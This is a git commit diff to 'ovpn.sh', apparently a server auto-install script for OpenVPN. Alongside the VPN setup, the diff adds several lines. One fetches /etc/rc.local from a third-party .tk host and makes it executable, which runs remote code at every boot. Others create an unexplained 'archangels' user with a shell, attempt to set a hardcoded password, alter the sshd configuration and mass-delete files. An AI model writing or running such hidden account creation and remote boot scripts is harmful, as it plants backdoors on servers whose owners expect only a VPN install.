9f519b105d4d0cca6ef3d627be284be06daf51d0
Samrey Steven <33366679+fluxo7@users.noreply.github.com>
2017-11-04 17:53:03 +0800

    Update ovpn.sh

--- ovpn.sh
+++ ovpn.sh
@@ -1,19 +1,21 @@
 #!/bin/bash
 
-# install openvpn
-apt-get install openvpn -y
+apt-get -y install openvpn
 wget -O /etc/openvpn/openvpn.tar "http://autoscriptnobita.tk/rendum/openvpn.tar"
-cd /etc/openvpn/
-tar xf openvpn.tar
+cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "http://autoscriptnobita.tk/rendum/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
+#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+#iptables-restore < /etc/iptables.up.rules
+# etc
 wget -O /home/vps/public_html/client.ovpn "http://autoscriptnobita.tk/rendum/client.ovpn"
-service openvpn restart
-sysctl -w net.ipv4.ip_forward=1
-sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
-wget -O /etc/iptables.conf "https://raw.github.com/mappakkoe09/debian/master/conf/iptables.conf"
-sed -i '$ i\iptables-restore < /etc/iptables.conf' /etc/rc.local
-
-myip2="s/ipserver/$myip/g";
-sed -i $myip2 /etc/iptables.conf;
-
+wget -O /etc/motd "http://autoscriptnobita.tk/rendum/motd"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+useradd -m -g users -s /bin/bash archangels
+echo "7C22C4ED" | chpasswd
+echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
 iptables-restore < /etc/iptables.conf
 service openvpn restart
